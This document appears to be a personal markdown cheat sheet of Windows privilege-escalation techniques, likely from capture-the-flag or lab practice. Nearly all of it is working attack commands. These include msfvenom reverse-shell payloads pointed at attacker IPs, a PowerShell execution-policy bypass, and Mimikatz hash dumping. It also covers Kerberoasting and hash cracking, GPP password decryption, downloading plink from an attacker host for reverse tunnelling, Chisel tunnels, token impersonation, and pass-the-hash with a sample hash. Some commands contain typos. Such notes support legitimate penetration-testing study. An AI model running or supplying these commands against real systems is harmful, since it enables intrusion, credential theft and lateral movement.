# Privesc

## Powerview

Start Powershell - powershell -ep bypass -ep bypasses the execution policy of powershell allowing you to easily run scripts
```
powershell -ep bypass
```

Start PowerView

```
. .\PowerView.ps1
```

Enumerate the domain users - 
```
Get-NetUser | select cn    
```

Enumerate the domain groups

```
Get-NetGroup -GroupName *admin*
```

Additional queries

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

## PowerUp a powershell script

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:

```
. .\PowerUp.ps1
Invoke-AllChecks
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.27.83 LPORT=4443 -e x86/sjikata -
f exe -o Advanced.exe
```

Encoded payload

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai
LHOST=10.11.9.134 LPORT=9091 -f exe -o bruce.exe
```

## Sherlock PowerShell script exploit suggester

Edit Sherlock.ps1 file and add line at the end.

```
...
Find-AllVulns
```

## BloodHound

```
powershell -ep bypass 

.\Downloads\SharpHound.ps1    

Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

Upload zip file into bloodhound.

## Mimikatz

Load mimikatz.

```
privilege::debug 
```
Ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator

Dump hashes

```
lsadump::lsa /patch
```

## Privilege Escalation Awesome Scripts SUITE

[GitHub - carlospolop/privilege-escalation-awesome-scripts-suite: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

## Additional reading

FuzzySecurity | Windows Privilege Escalation Fundamentals

[FuzzySecurity | Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)[FuzzySecurity | Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)

Windows Privilege Escalation Guide

[Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

## Token Impersonation with Incognito

On a meterpreter shell load incognito

```
list_tokens -u
impersonate_toker token\\name
rev2self on meterpreter (reverts back to the initial permissions)
```

## Kerberoasting

Once we have user credentials we can retrieve services with administrator accounts

Using the GetUserSPNS.py (impacket)

```
GetUserSPNS.py domain.local/user:password -dc-ip 192.168.57.140 -request
GetUserSPNS.py -request -dc-ip IP TARGET(domain/user)
```

Find hashcat hash type

```
hashcat --1 help | grep Kerberos
hashcat -m 13100 hashes4.txt rockyou.txt -O
```

## Abusing GPP

Find the Groups.xml file.
Retrieve the cpassword hash. Decrypt.

```
gpp-decrypt hash
```

## Port Forwarding/Tunneling

### Plink 

Download `plink.exe`

```
C:\Users\Alfred>powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.8/plink.exe', 'plink.exe')"
```

Start SSH service on our attacking box.

```
root@kali:~# service ssh start
```

Run `plink.exe`

```
C:\Users\Alfred>plink.exe -l root -pw  -R 445:127.0.0.1:445 ATK_IP
```

Use `winexe` to get a shell

```
root@kali:~# winexe -U Administrator //127.0.0.1 "cmd.exe"

or

psexec.py USER:PASSWORD@IP cmd.exe
```

### Chisel

On the attacking machine start the server

```
./chisel server -p 8081 -reverse
```

On the target machine start the listening client
```
.\chisel.exe client 10.10.14.97:8081 R:8888:127.0.0.1:8888
```
## Abusing Token Privileges For Windows Local Privilege Escalation

While using meterpreter

ps shows all of the running processes

```
meterpreter > migrate PID
to migrate to a higher authority process(ex: spoolsv.exe)

meterpreter > load kiwi
to load mimikatz
```

TODO: Good reads

https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/

## Windows-Exploit-Suggester

update the database

```
$ ./windows-exploit-suggester.py --update
```

install dependencies

(install python-xlrd, \$ pip install xlrd --upgrade)

feed it "systeminfo" input, and point it to the microsoft database

```
$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
```

[Windows-Exploit-Suggester GitHub](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

## Pass the hash attack

```
pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //IP cmd.exe
```
